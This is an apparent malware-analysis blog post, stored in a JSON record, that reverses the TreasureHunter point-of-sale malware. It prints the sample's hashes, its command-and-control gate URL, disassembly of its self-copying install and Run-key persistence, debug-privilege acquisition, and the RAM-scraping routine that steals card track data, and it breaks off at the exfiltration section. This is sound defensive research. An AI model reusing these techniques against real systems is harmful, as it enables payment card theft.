{
    "id": "0b3c4b3e-1916-4cd7-857a-5e3b94bee85e",
    "created_at": "2023-01-12T15:02:49.731854Z",
    "updated_at": "2025-03-27T02:05:52.660621Z",
    "deleted_at": null,
    "sha1_hash": "6728a4a4dbf01ab098c9e55c1815868be1b915ef",
    "title": "2017-02-26 - TreasureHunter - A POS Malware Case Study",
    "authors": "",
    "file_creation_date": "2022-05-27T23:16:59Z",
    "file_modification_date": "2022-05-27T23:16:59Z",
    "file_size": 399436,
    "plain_text": "# TreasureHunter : A POS Malware Case Study\n\n**adelmas.com/blog/treasurehunter.php**\n\n#### 26/02/2017\n\n## Introduction\n\n#### TreasureHunter is a POS malware first observed in 2014 and which got some recognition through 2016. Most POS malwares are pretty simple and don't have the advanced capabilities we can find in banking malwares for example. Their main feature is RAM scraping, which consists of looking for PAN and other credit card credentials in running process' memory. Reversing them is rather quick and a good exercise if you're new to malware analysis.\n\n POS malwares are not very well documented and detailed articles about POS malwares are rare, so I thought it would be interesting to reverse one and write a post about it. Furthermore, I decided to use radare2 to do so to bring a bit of originality. Plus, I've been enjoying using r2 a lot lately, it gets very efficient with a bit of practice.\n\n I downloaded the sample here : http://www.kernelmode.info/forum/viewtopic.php? f=16&t=1756&sid=40a9207c6336357f87455967de77a3ea&start=230#p28535, kindly posted by Benkow.\n\n Hashes :\n```\n$ rahash2 -a md5,sha256,sha1 treasurehunter.bin\ntreasurehunter.bin: 0x00000000-0x00013bff md5: bd50b22d1caee56b5d3fbd8e7816ab88\ntreasurehunter.bin: 0x00000000-0x00013bff sha1:\n55f39ca3b68b92e898f9f86f3de1b03d3b88f5d9\ntreasurehunter.bin: 0x00000000-0x00013bff sha256:\n3f54aaa6d2cb5c7ff3f6d41790b40de47e8f870fe96aaecec4342ab84f700def\n\n VirusTotal Analysis, Malwr Analysis (When it's alive again).\n\n## Analysis\n\n### First look\n\n#### Basic information about the binary :\n\n```\n\n-----\n\n```\n[0x0040523b]> i\ntype   EXEC (Executable file)\nfile   treasurehunter.bin\nfd    6\nsize   0x13c00\niorw   false\nblksz  0x0\nmode   -r-block  0x100\nformat  pe\nhavecode true\npic   true\ncanary  false\nnx    true\ncrypto  false\nva    true\nbintype pe\nclass  PE32\narch   x86\nbits   32\nmachine i386\nos    windows\nminopsz 1\nmaxopsz 16\npcalign 0\nsubsys  Windows GUI\nendian  little\nstripped true\nstatic  false\nlinenum false\nlsyms  false\nrelocs  false\nbinsz  80896\ncompiled Sun Oct 19 09:14:39 2014\ndbg_file C:\\\\Users\\\\Admin\\\\documents\\\\visual studio\n2012\\\\Projects\\\\treasureHunter\\\\Release\\\\treasureHunter.pdb\nhdr.csum 0x00000000\ncmp.csum 0x000216eb\nguid   82A5304F6FFB4D168B2CFA9D11F54A991\n\n#### Some interesting strings :\n\n```\n\n-----\n\n```\nvaddr 0x0040fea8 paddr 0x0000e4a8 ordinal 451 sz 24 len 23 section .rdata type ascii\nstring=J8DfbsnQabc730OkDqaDmaC\nvaddr=0x0040fec4 paddr=0x0000e4c4 ordinal=452 sz=28 len=13 section=.rdata type=wide\nstring=Debug Message\nvaddr=0x0040fee0 paddr=0x0000e4e0 ordinal=453 sz=9 len=8 section=.rdata type=ascii\nstring=System33\nvaddr=0x0040feec paddr=0x0000e4ec ordinal=454 sz=9 len=8 section=.rdata type=ascii\nstring=SysWOW64\nvaddr=0x0040fef8 paddr=0x0000e4f8 ordinal=455 sz=22 len=21 section=.rdata type=ascii\nstring=\\Windows\\explorer.exe\nvaddr=0x0040ff28 paddr=0x0000e528 ordinal=456 sz=147 len=146 section=.rdata\ntype=ascii string=Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;\nInfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)\nvaddr=0x0040ffc0 paddr=0x0000e5c0 ordinal=457 sz=151 len=150 section=.rdata\ntype=ascii string=Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0;\nWOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR\n3.0.30729)\nvaddr=0x00410058 paddr=0x0000e658 ordinal=458 sz=13 len=12 section=.rdata type=ascii\nstring=?report=true\nvaddr=0x00410068 paddr=0x0000e668 ordinal=459 sz=14 len=13 section=.rdata type=ascii\nstring=?request=true\nvaddr=0x00410078 paddr=0x0000e678 ordinal=460 sz=10 len=4 section=.rdata type=wide\nstring=POST\nvaddr=0x00410088 paddr=0x0000e688 ordinal=461 sz=96 len=47 section=.rdata type=wide\nstring=Content-Type: application/x-www-form-urlencoded\nvaddr=0x0040fd58 paddr=0x0000e358 ordinal=439 sz=31 len=30 section=.rdata type=ascii\nstring=x0000m.net/test/local/gate.php\nvaddr=0x00410320 paddr=0x0000e920 ordinal=473 sz=92 len=45 section=.rdata type=wide\nstring=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nvaddr=0x00410980 paddr=0x0000ef80 ordinal=492 sz=238 len=118 section=.rdata type=wide\nstring=TreasureHunter version 0.1 Alpha, created by Jolly Roger (jollyroger@prv.name)\nfor BearsInc. Greets to Xylitol and co.\n\n#### Imports :\n\n```\n\n-----\n\n```\n[0x0040523b]> ii\n[Imports]\nordinal=001 plt=0x0040c020 bind=NONE type=FUNC name=KERNEL32.dll_ReadProcessMemory\nordinal=002 plt=0x0040c024 bind=NONE type=FUNC name=KERNEL32.dll_LeaveCriticalSection\nordinal=003 plt=0x0040c028 bind=NONE type=FUNC name=KERNEL32.dll_CreateProcessA\nordinal=004 plt=0x0040c02c bind=NONE type=FUNC name=KERNEL32.dll_CreateFileW\nordinal=005 plt=0x0040c030 bind=NONE type=FUNC name=KERNEL32.dll_CreateDirectoryA\nordinal=006 plt=0x0040c034 bind=NONE type=FUNC name=KERNEL32.dll_CopyFileA\nordinal=007 plt=0x0040c038 bind=NONE type=FUNC name=KERNEL32.dll_EnterCriticalSection\nordinal=008 plt=0x0040c03c bind=NONE type=FUNC name=KERNEL32.dll_Process32FirstW\nordinal=009 plt=0x0040c040 bind=NONE type=FUNC name=KERNEL32.dll_DeviceIoControl\nordinal=010 plt=0x0040c044 bind=NONE type=FUNC name=KERNEL32.dll_Module32FirstW\nordinal=011 plt=0x0040c048 bind=NONE type=FUNC name=KERNEL32.dll_GetModuleFileNameA\nordinal=012 plt=0x0040c04c bind=NONE type=FUNC name=KERNEL32.dll_Sleep\nordinal=013 plt=0x0040c050 bind=NONE type=FUNC name=KERNEL32.dll_CreateMutexA\nordinal=014 plt=0x0040c054 bind=NONE type=FUNC\nname=KERNEL32.dll_CreateToolhelp32Snapshot\nordinal=015 plt=0x0040c058 bind=NONE type=FUNC name=KERNEL32.dll_ReleaseMutex\nordinal=016 plt=0x0040c05c bind=NONE type=FUNC name=KERNEL32.dll_CloseHandle\nordinal=017 plt=0x0040c060 bind=NONE type=FUNC name=KERNEL32.dll_GetCurrentProcessId\nordinal=018 plt=0x0040c064 bind=NONE type=FUNC name=KERNEL32.dll_DeleteFileA\nordinal=019 plt=0x0040c068 bind=NONE type=FUNC name=KERNEL32.dll_CreateThread\nordinal=020 plt=0x0040c06c bind=NONE type=FUNC name=KERNEL32.dll_SetFilePointerEx\nordinal=021 plt=0x0040c070 bind=NONE type=FUNC name=KERNEL32.dll_SetStdHandle\nordinal=022 plt=0x0040c074 bind=NONE type=FUNC name=KERNEL32.dll_GetConsoleMode\nordinal=023 plt=0x0040c078 bind=NONE type=FUNC name=KERNEL32.dll_OpenProcess\nordinal=024 plt=0x0040c07c bind=NONE type=FUNC\nname=KERNEL32.dll_InitializeCriticalSection\nordinal=025 plt=0x0040c080 bind=NONE type=FUNC name=KERNEL32.dll_VirtualQueryEx\nordinal=026 plt=0x0040c084 bind=NONE type=FUNC name=KERNEL32.dll_OutputDebugStringW\nordinal=027 plt=0x0040c088 bind=NONE type=FUNC name=KERNEL32.dll_WaitForSingleObject\nordinal=028 plt=0x0040c08c bind=NONE type=FUNC name=KERNEL32.dll_GetCurrentProcess\nordinal=029 plt=0x0040c090 bind=NONE type=FUNC name=KERNEL32.dll_Process32NextW\nordinal=030 plt=0x0040c094 bind=NONE type=FUNC name=KERNEL32.dll_ExitProcess\nordinal=031 plt=0x0040c098 bind=NONE type=FUNC name=KERNEL32.dll_GetConsoleCP\nordinal=032 plt=0x0040c09c bind=NONE type=FUNC name=KERNEL32.dll_FlushFileBuffers\nordinal=033 plt=0x0040c0a0 bind=NONE type=FUNC name=KERNEL32.dll_HeapSize\nordinal=034 plt=0x0040c0a4 bind=NONE type=FUNC name=KERNEL32.dll_RtlUnwind\nordinal=035 plt=0x0040c0a8 bind=NONE type=FUNC name=KERNEL32.dll_LoadLibraryW\nordinal=036 plt=0x0040c0ac bind=NONE type=FUNC name=KERNEL32.dll_LoadLibraryExW\nordinal=037 plt=0x0040c0b0 bind=NONE type=FUNC name=KERNEL32.dll_LCMapStringW\nordinal=038 plt=0x0040c0b4 bind=NONE type=FUNC name=KERNEL32.dll_GetLastError\nordinal=039 plt=0x0040c0b8 bind=NONE type=FUNC name=KERNEL32.dll_MultiByteToWideChar\nordinal=040 plt=0x0040c0bc bind=NONE type=FUNC name=KERNEL32.dll_HeapFree\nordinal=041 plt=0x0040c0c0 bind=NONE type=FUNC name=KERNEL32.dll_HeapAlloc\nordinal=042 plt=0x0040c0c4 bind=NONE type=FUNC name=KERNEL32.dll_WideCharToMultiByte\nordinal=043 plt=0x0040c0c8 bind=NONE type=FUNC name=KERNEL32.dll_HeapReAlloc\nordinal=044 plt=0x0040c0cc bind=NONE type=FUNC name=KERNEL32.dll_GetCommandLineA\nordinal=045 plt=0x0040c0d0 bind=NONE type=FUNC name=KERNEL32.dll_IsDebuggerPresent\nordinal=046 plt=0x0040c0d4 bind=NONE type=FUNC\nname=KERNEL32.dll_IsProcessorFeaturePresent\nordinal=047 plt=0x0040c0d8 bind=NONE type=FUNC name=KERNEL32.dll_EncodePointer\nordinal=048 plt=0x0040c0dc bind=NONE type=FUNC name=KERNEL32.dll_DecodePointer\nordinal=049 plt=0x0040c0e0 bind=NONE type=FUNC name=KERNEL32.dll_InterlockedIncrement\nordinal=050 plt=0x0040c0e4 bind=NONE type=FUNC name=KERNEL32.dll_InterlockedDecrement\n\n```\n\n-----\n\n```\nordinal 051 plt 0x0040c0e8 bind NONE type FUNC name KERNEL32.dll_IsValidCodePage\nordinal=052 plt=0x0040c0ec bind=NONE type=FUNC name=KERNEL32.dll_GetACP\nordinal=053 plt=0x0040c0f0 bind=NONE type=FUNC name=KERNEL32.dll_GetOEMCP\nordinal=054 plt=0x0040c0f4 bind=NONE type=FUNC name=KERNEL32.dll_GetCPInfo\nordinal=055 plt=0x0040c0f8 bind=NONE type=FUNC name=KERNEL32.dll_SetLastError\nordinal=056 plt=0x0040c0fc bind=NONE type=FUNC name=KERNEL32.dll_GetCurrentThreadId\nordinal=057 plt=0x0040c100 bind=NONE type=FUNC name=KERNEL32.dll_GetProcessHeap\nordinal=058 plt=0x0040c104 bind=NONE type=FUNC name=KERNEL32.dll_GetModuleHandleExW\nordinal=059 plt=0x0040c108 bind=NONE type=FUNC name=KERNEL32.dll_GetProcAddress\nordinal=060 plt=0x0040c10c bind=NONE type=FUNC name=KERNEL32.dll_GetStdHandle\nordinal=061 plt=0x0040c110 bind=NONE type=FUNC name=KERNEL32.dll_WriteFile\nordinal=062 plt=0x0040c114 bind=NONE type=FUNC name=KERNEL32.dll_GetModuleFileNameW\nordinal=063 plt=0x0040c118 bind=NONE type=FUNC name=KERNEL32.dll_GetFileType\nordinal=064 plt=0x0040c11c bind=NONE type=FUNC\nname=KERNEL32.dll_InitializeCriticalSectionAndSpinCount\nordinal=065 plt=0x0040c120 bind=NONE type=FUNC\nname=KERNEL32.dll_DeleteCriticalSection\nordinal=066 plt=0x0040c124 bind=NONE type=FUNC name=KERNEL32.dll_GetStartupInfoW\nordinal=067 plt=0x0040c128 bind=NONE type=FUNC\nname=KERNEL32.dll_QueryPerformanceCounter\nordinal=068 plt=0x0040c12c bind=NONE type=FUNC\nname=KERNEL32.dll_GetSystemTimeAsFileTime\nordinal=069 plt=0x0040c130 bind=NONE type=FUNC\nname=KERNEL32.dll_GetEnvironmentStringsW\nordinal=070 plt=0x0040c134 bind=NONE type=FUNC\nname=KERNEL32.dll_FreeEnvironmentStringsW\nordinal=071 plt=0x0040c138 bind=NONE type=FUNC\nname=KERNEL32.dll_UnhandledExceptionFilter\nordinal=072 plt=0x0040c13c bind=NONE type=FUNC\nname=KERNEL32.dll_SetUnhandledExceptionFilter\nordinal=073 plt=0x0040c140 bind=NONE type=FUNC name=KERNEL32.dll_TerminateProcess\nordinal=074 plt=0x0040c144 bind=NONE type=FUNC name=KERNEL32.dll_TlsAlloc\nordinal=075 plt=0x0040c148 bind=NONE type=FUNC name=KERNEL32.dll_TlsGetValue\nordinal=076 plt=0x0040c14c bind=NONE type=FUNC name=KERNEL32.dll_TlsSetValue\nordinal=077 plt=0x0040c150 bind=NONE type=FUNC name=KERNEL32.dll_TlsFree\nordinal=078 plt=0x0040c154 bind=NONE type=FUNC name=KERNEL32.dll_GetModuleHandleW\nordinal=079 plt=0x0040c158 bind=NONE type=FUNC name=KERNEL32.dll_GetStringTypeW\nordinal=080 plt=0x0040c15c bind=NONE type=FUNC name=KERNEL32.dll_WriteConsoleW\nordinal=001 plt=0x0040c16c bind=NONE type=FUNC name=USER32.dll_MessageBoxA\nordinal=002 plt=0x0040c170 bind=NONE type=FUNC name=USER32.dll_MessageBoxW\nordinal=001 plt=0x0040c000 bind=NONE type=FUNC\nname=ADVAPI32.dll_AdjustTokenPrivileges\nordinal=002 plt=0x0040c004 bind=NONE type=FUNC name=ADVAPI32.dll_RegOpenKeyExW\nordinal=003 plt=0x0040c008 bind=NONE type=FUNC\nname=ADVAPI32.dll_LookupPrivilegeValueW\nordinal=004 plt=0x0040c00c bind=NONE type=FUNC name=ADVAPI32.dll_RegQueryValueExW\nordinal=005 plt=0x0040c010 bind=NONE type=FUNC name=ADVAPI32.dll_RegSetValueExA\nordinal=006 plt=0x0040c014 bind=NONE type=FUNC name=ADVAPI32.dll_OpenProcessToken\nordinal=007 plt=0x0040c018 bind=NONE type=FUNC name=ADVAPI32.dll_RegCloseKey\nordinal=001 plt=0x0040c164 bind=NONE type=FUNC name=SHELL32.dll_SHGetFolderPathA\nordinal=001 plt=0x0040c178 bind=NONE type=FUNC name=WINHTTP.dll_WinHttpCloseHandle\nordinal=002 plt=0x0040c17c bind=NONE type=FUNC\nname=WINHTTP.dll_WinHttpQueryDataAvailable\nordinal=003 plt=0x0040c180 bind=NONE type=FUNC name=WINHTTP.dll_WinHttpSendRequest\nordinal=004 plt=0x0040c184 bind=NONE type=FUNC\n\n```\n\n-----\n\n```\nname WINHTTP.dll_WinHttpReceiveResponse\nordinal=005 plt=0x0040c188 bind=NONE type=FUNC name=WINHTTP.dll_WinHttpOpen\nordinal=006 plt=0x0040c18c bind=NONE type=FUNC name=WINHTTP.dll_WinHttpOpenRequest\nordinal=007 plt=0x0040c190 bind=NONE type=FUNC name=WINHTTP.dll_WinHttpReadData\nordinal=008 plt=0x0040c194 bind=NONE type=FUNC\nname=WINHTTP.dll_WinHttpAddRequestHeaders\nordinal=009 plt=0x0040c198 bind=NONE type=FUNC name=WINHTTP.dll_WinHttpConnect\n99 imports\n\n#### A ton of debug messages are displayed in MessageBox() if a particular DWORD @ 0x00414EDC is set to 1. This confirms that TreasureHunter was still under development. What's curious is that the author copied the same lines of code everywhere he wanted to display a debug message. Such an inefficient way to debug your binary.\n\n### Installation\n\n#### When executed with no parameter, the malware copies itself to %APPDATA%\\ {StringDerivatedFromProductID}\\jucheck.exe, encrypts its path with a custom algorithm and launches this new process with that encrypted path as a parameter. This parameter is then converted into its hex value and decrypted by the fresh copy of the malware which can now deletes its old self. Not sure why the path is encrypted, but whatever.\n\n```\n\n-----\n\n```\n|      0x0040417c   8985ecfdffff  mov dword [ebp local_214h], eax\n|      0x00404182   8d85f4fdffff  lea eax, [ebp - local_20ch]\n|      0x00404188   50       push eax\n|      0x00404189   6a00      push 0\n|      0x0040418b   6a00      push 0\n|      0x0040418d   6a1a      push 0x1a ; CSIDL_APPDATA\n|      0x0040418f   6a00      push 0\n|      0x00404191   ff1564c14000  call dword\n[sym.imp.SHELL32.dll_SHGetFolderPathA] ; \"Z..\" @ 0x40c164\n[...]\n| `------> 0x0040431a   6a00      push 0\n|   |||  0x0040431c   ffb5e8fdffff  push dword [ebp - local_218h] ;\nDerivatedFromProductId\n|   |||  0x00404322   ff1530c04000  call dword\n[sym.imp.KERNEL32.dll_CreateDirectoryA] ; \"z..\" @ 0x40c030\n|  `-----> 0x0040434b   6a01      push 1           ; \"Z.\"\n|  ||||  0x0040434d   53       push ebx ; New filename (\"jucheck.exe\")\n|  ||||  0x0040434e   8d85f8feffff  lea eax, [ebp - local_108h]\n|  ||||  0x00404354   50       push eax ; Path to this executable \n|  ||||  0x00404355   ff1534c04000  call dword\n[sym.imp.KERNEL32.dll_CopyFileA] ; sym.imp.KERNEL32.dll_CopyFileA\n[...]\n|  ||||  0x00404481   e84afbffff   call reg_startup ; Writes\n[SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\jucheck] = Path to jucheck.exe\n[...]\n|  ||||  0x004044ed   6a00      push 0\n|  ||||  0x004044ef   6a20      push 0x20 ; CREATE_NEW_PROCESS_GROUP\n|  ||||  0x004044f1   6a00      push 0\n|  ||||  0x004044f3   6a00      push 0\n|  ||||  0x004044f5   6a00      push 0\n|  ||||  0x004044f7   50       push eax ; Path to new executable +\nEncrypted path to this one\n|  ||||  0x004044f8   53       push ebx ; Path to new executable\n|  ||||  0x004044f9   ff1528c04000  call dword\n[sym.imp.KERNEL32.dll_CreateProcessA] ; \"Z..\" @ 0x40c028\n\n#### The encrypted parameter is derivated from the hardcoded value J8DfbsnQabc730OkDqaDmaC and the original malware path. Here is what I got :\n001DFB38 005A6930 \n\"C:\\\\Users\\\\arnaud\\\\AppData\\\\Roaming\\\\a18948d649742114cb84de349fe6f1d0\\\\jucheck.exe\n014b789e32bcf2c0bddeb35bd5880193de8e5405ae98d55ee55f9efea91453a8\"\n\n The parameter is decrypted by the malware in the function @ 0x004023F0. IDA produces the corresponding pseudocode below :\n\n```\n\n-----\n\n```\n_BYTE __usercall sub_4023F0@<eax>(int a1@<edx>, int a2@<ecx>, int a3, _BYTE buffer)\n{\n int v4; // eax@1\n int v5; // esi@1\n int v6; // edi@1\n _BYTE *buffer_out; // ebx@2\n int v8; // ecx@3\n bool v9; // zf@3\n _BYTE *result; // eax@4\n int v11; // [sp+8h] [bp-Ch]@2\n int v12; // [sp+10h] [bp-4h]@1\n v4 = a2;\n LOBYTE(v5) = 0;\n v6 = 0;\n v12 = a2;\n if ( a3 <= 0 )\n {\n  result = buffer;\n  *buffer = 0;\n }\n else\n {\n  buffer_out = buffer;\n  v11 = a3;\n  do\n  {\n   v6 = (v6 + 1) % 256;\n   v8 = *(_DWORD *)(v4 + 4 * v6);\n   v5 = (unsigned __int8)(v8 + v5);\n   ++buffer_out;\n   *(_DWORD *)(v12 + 4 * v6) = *(_DWORD *)(v4 + 4 * v5);\n   *(_DWORD *)(v12 + 4 * v5) = v8;\n   v9 = a3-- == 1;\n   *(buffer_out - 1) = buffer_out[a1 - (_DWORD)buffer - 1] ^ *(_BYTE *)(v12\n                                     + 4\n                                     * (unsigned\n__int8)(v8\n+ *(_DWORD *)(v12 + 4 * v6)));\n   v4 = v12;\n  }\n  while ( !v9 );\n  result = buffer;\n  buffer[v11] = 0;\n }\n return result;\n}\n\n#### TreasureHunter tries to get Debug privileges before it starts its RAM scraping process, as shown by the Assembly code below :\n\n```\n\n-----\n\n```\n|      0x00404730   8d442410    lea eax, [esp + local_10h] ; 0x10\n|      0x00404734   50       push eax\n|      0x00404735   6a28      push 0x28          ; '(' ; '('\n|      0x00404737   ff158cc04000  call dword\n[sym.imp.KERNEL32.dll_GetCurrentProcess] ; sym.imp.KERNEL32.dll_GetCurrentProcess\n|      0x0040473d   50       push eax\n|      0x0040473e   ff1514c04000  call dword\n[sym.imp.ADVAPI32.dll_OpenProcessToken] ; sym.imp.ADVAPI32.dll_OpenProcessToken\n|      0x00404744   8d442414    lea eax, [esp + local_14h] ; 0x14\n|      0x00404748   50       push eax\n|      0x00404749   68fc014100   push str.SeDebugPrivilege ;\nstr.SeDebugPrivilege ; \"SeDebugPrivilege\" @ 0x4101fc\n|      0x0040474e   6a00      push 0\n|      0x00404750   ff1508c04000  call dword\n[sym.imp.ADVAPI32.dll_LookupPrivilegeValueW] ;\nsym.imp.ADVAPI32.dll_LookupPrivilegeValueW\n|      0x00404756   8b442414    mov eax, dword [esp + local_14h] ;\n[0x14:4]=0\n|      0x0040475a   6a00      push 0\n|      0x0040475c   89442424    mov dword [esp + local_24h], eax\n|      0x00404760   8b44241c    mov eax, dword [esp + local_1ch] ;\n[0x1c:4]=0\n|      0x00404764   6a00      push 0\n|      0x00404766   6a10      push 0x10\n|      0x00404768   89442430    mov dword [esp + local_30h], eax\n|      0x0040476c   8d442428    lea eax, [esp + local_28h] ; 0x28 ; '('\n|      0x00404770   50       push eax\n|      0x00404771   6a00      push 0\n|      0x00404773   ff742424    push dword [esp + local_24h]\n|      0x00404777   c74424340100. mov dword [esp + local_34h], 1\n|      0x0040477f   c74424400200. mov dword [esp + local_40h], 2\n|      0x00404787   ff1500c04000  call dword\n[sym.imp.ADVAPI32.dll_AdjustTokenPrivileges] ; \"&..\" @ 0x40c000\n\n#### Then, the malware achieves persistency by writing a new startup key in registry. See \"Persistency\" part for more details about the reg_startup routine @ 0x0x403FD0.\n\n### Configuration\n\n#### The configuration is pretty simple and hardcoded in global variables :\n\n```\n\n-----\n\n```\n|      0x00401618   b9d8fd4000   mov ecx, str.600000     ; 600000 @\n0x40fdd8\n|      0x0040161d   e83efcffff   call to_int\n|      0x00401622   b9f8fd4000   mov ecx, 0x40fdf8      ; \"180000\"\n|      0x00401627   a3944e4100   mov dword [0x414e94], eax  ;\n[0x414e94:4]=0\n|      0x0040162c   e82ffcffff   call to_int\n|      0x00401631   a39c4e4100   mov dword [0x414e9c], eax  ;\n[0x414e9c:4]=0\n|      0x00401636   33c0      xor eax, eax\n|      0x00401638   803d18fe4000. cmp byte\n[str.1SE_CLINGFISH_MODE_PLACEHOLDER], 0x31 ; [0x31:1]=0 ; '1'\n|      0x0040163f   b938fe4000   mov ecx, str.180000     ; \"180000\" @\n0x40fe38\n|      0x00401644   0f94c0     sete al\n|      0x00401647   a3b04e4100   mov dword [0x414eb0], eax  ;\n[0x414eb0:4]=0\n|      0x0040164c   e80ffcffff   call to_int\n|      0x00401651   b95cfe4000   mov ecx, str.6000000    ; \"6000000\" @\n0x40fe5c\n|      0x00401656   a3a44e4100   mov dword [0x414ea4], eax  ;\n[0x414ea4:4]=0\n|      0x0040165b   e800fcffff   call to_int\n|      0x00401660   b98cfe4000   mov ecx, 0x40fe8c      ; \"50\"\n|      0x00401665   a3984e4100   mov dword [0x414e98], eax  ;\n[0x414e98:4]=0\n|      0x0040166a   e8f1fbffff   call to_int\n|      0x0040166f   5f       pop edi\n|      0x00401670   5e       pop esi\n|      0x00401671   a3ac4e4100   mov dword [0x414eac], eax  ;\n[0x414eac:4]=0\n|      0x00401676   c705844e4100. mov dword [0x414e84],\nstr.J8DfbsnQabc730OkDqaDmaC ; [0x414e84:4]=0\n\n#### These parameters are mostly waiting time values and the campaign id\nJ8DfbsnQabc730OkDqaDmaC .\n\n### Persistency\n\n#### TreasureHunter writes a new key in the startup registry to stay persistent on an infected system. The reg_startup routine is located @ 0x403FD0 :\n\n```\n\n-----\n\n```\n.\n-------------------------.\n| [0x403fd0] ;[c]                                  \n|\n| (fcn) sub.ADVAPI32.dll_RegOpenKeyExW_fd0 332                    \n|\n|  sub.ADVAPI32.dll_RegOpenKeyExW_fd0 ();                      \n|\n| ; var int local_4h @ ebp-0x4                            \n|\n|  ; CALL XREF from 0x00404481 (sub.KERNEL32.dll_WaitForSingleObject_120)     \n|\n| push ebp                                      \n|\n| mov ebp, esp                                    \n|\n| push ecx                                      \n|\n| push ebx                                      \n|\n| push esi                                      \n|\n| lea eax, [ebp - local_4h]                             \n|\n| push eax                                      \n|\n| push 0xf003f                                    \n|\n| push 0                                       \n|\n|  ; \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" @ 0x410320          \n|\n| push str.SOFTWARE_Microsoft_Windows_CurrentVersion_Run ;\nstr.SOFTWARE_Microsoft_Windows_CurrentVersion_Run |\n| push 0x80000002                                  \n|\n| mov ebx, ecx                                    \n|\n|  ; sym.imp.ADVAPI32.dll_RegOpenKeyExW                      \n|\n| call dword [sym.imp.ADVAPI32.dll_RegOpenKeyExW] ;[a]                \n|\n|  ; [0x40c170:4]=0x1139c reloc.USER32.dll_MessageBoxW_156             \n|\n|  ; LEA sym.imp.USER32.dll_MessageBoxW                      \n|\n|  ; sym.imp.USER32.dll_MessageBoxW                        \n|\n| mov esi, dword [sym.imp.USER32.dll_MessageBoxW]                  \n|\n| test eax, eax                                   \n|\n| je 0x404096 ;[b]                                  \n|\n`-----------------------------------------------------------------------------------\n```\n\n-----\n\n```\n[Some checks...]\n.--------------------------------------------------------.\n| 0x4040a7 ;[s]                     |\n| sub ecx, edx                      |\n|  ; 0x2                        |\n| lea eax, [ecx*2 + 2]                  |\n| push eax                        |\n| push ebx                        |\n| push 1                         |\n| push 0                         |\n|  ; \"jucheck\" @ 0x4104a4               |\n| push str.jucheck ; str.jucheck             |\n| push dword [ebp - local_4h] ; Path to exe       |\n|  ; sym.imp.ADVAPI32.dll_RegSetValueExA        |\n| call dword [sym.imp.ADVAPI32.dll_RegSetValueExA] ;[q] |\n| test eax, eax                     |\n| je 0x4040f2 ;[r]                    |\n`--------------------------------------------------------'\n\n### RAM Scraping : Looking for Credit Card Credentials\n\n#### TreasureHunter doesn't have any hooking capabilities, it relies entirely on RAM scraping to try and steal credit card PAN. TreasureHunter will list all running process the usual way (CreateToolhelp32Snapshot(), Process32FirstW(), Process32NextW()) and reads their memory with ReadProcessMemory(), looking for strings that matches its track1 and track2 parser. You can find information about track1 and track2 format and service codes on this Wikipedia page : https://en.wikipedia.org/wiki/Magnetic_stripe_card#Financial_cards, it helps understand the TreasureHunter parser.\n\n For each process where the previous operations succeeded, the malware will start monitoring its memory using the same RAM scraping routine looping in a thread every 180 seconds (value from config). I guess that's what the author calls \"Clingfish mode\".\n\n```\n\n-----\n\n```\nDWORD __stdcall thread_clingfish(LPVOID lpThreadParameter)\n{\n void *v1; // esi@1\n HANDLE v2; // edi@2\n v1 = malloc(0x20Au);\n if ( !v1 )\n {\n  if ( bDebug == 1 )\n   MessageBoxW(0, L\"cannot allocate more space!\", L\"Debug Message\", 0);\n  ExitProcess(0);\n }\n v2 = OpenProcess(0x410u, 0, (DWORD)lpThreadParameter);\n if ( v2 && sub_403B10((DWORD)lpThreadParameter, (int)v1) )\n {\n  if ( bDebug == 1 )\n   MessageBoxW(0, L\"Clingfish mode activated!\", L\"Debug Message\", 0);\n  while ( 1 )\n  {\n   search_process_mem(v2, (int)v1, lpThreadParameter);\n   Sleep(dw180000);\n  }\n }\n free(v1);\n CloseHandle(v2);\n return 0;\n}\n\n#### I identified the main functions of this thread responsible of looking for PANs, validating track1 / track2 format and checking Luhn algorithm and service codes :\n\n 0x004038A0 : search_process_mem 0x004033A0 : check_pan 0x00403280 : parse_track1 0x00403320 : parse_track2 0x004031D0 : check_pattern 0x00403040 : check_luhn 0x00403140 : is_format_b 0x004010C0 : check_service_codes\n\n You can find a r2 script to label the main functions of the malware in the last part of this article.\n\n I won't detail the parsers, they strictly do what the wikipedia page says. Note that a process is ignored if its name contains the following strings :\n\n```\n\n-----\n\n```\n[0x00413000]> pd 3\n  ; DATA XREF from 0x00403a9c (is_blacklisted)\n  ; DATA XREF from 0x00403aa1 (is_blacklisted)\n0x00413000 .dword 0x0040fee0 ; str.System33\n0x00413004 .dword 0x0040feec ; str.SysWOW64\n0x00413008 .dword 0x0040fef8 ; str._Windows_explorer.exe\n[0x00413000]> px 48 @ 0x0040fee0\n- offset -  0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF\n0x0040fee0 5379 7374 656d 3333 0000 0000 5379 7357 System33....SysW\n0x0040fef0 4f57 3634 0000 0000 5c57 696e 646f 7773 OW64....\\Windows\n0x0040ff00 5c65 7870 6c6f 7265 722e 6578 6500 0000 \\explorer.exe...\n\n#### Why System33 ? No idea.\n\n Furthermore, TreasureHunter only picks PANs that have the following service codes (see check_service_codes routine @ 0x004010C0) :\n[0x004010c0]> pf zzzzzz @ 0x0040FF10\n0x0040ff10 = 101\n0x0040ff14 = 201\n0x0040ff18 = 121\n0x0040ff1c = 231\n0x0040ff20 = 221\n0x0040ff24 = 110\n\n It increases a DWORD @ 0x00413D98 when a valid track1 / track2 PAN is found in a process, and sets it back to 0 after PANs are sent to the gate.\n\n You can easily trigger those types of malwares by compiling and executing the following C++ code (taken from http://www.kernelmode.info/forum/viewtopic.php? f=16&t=1756&start=50#p18059) :\n#include <iostream>\n#include <conio.h>\n#include <windows.h>\nusing namespace std;\nchar track1[100] = \"%B4560710014901111^TEST JIM/BOGUS\nJOS^1107101169940000000710717906968?\";\nchar track2[100] = \"4744870016311111=14091010000000000072\";\nint main(){\n  cout << track1 << endl;\n  cout << track2 << endl;\n  getch();\n  return 0;\n}\n\n### CnC & Data exfiltration\n\n```\n\n-----\n\n#### TreasureHunter uses HTTP POST requests to contact and send credentials collected to its CnC. The gate is 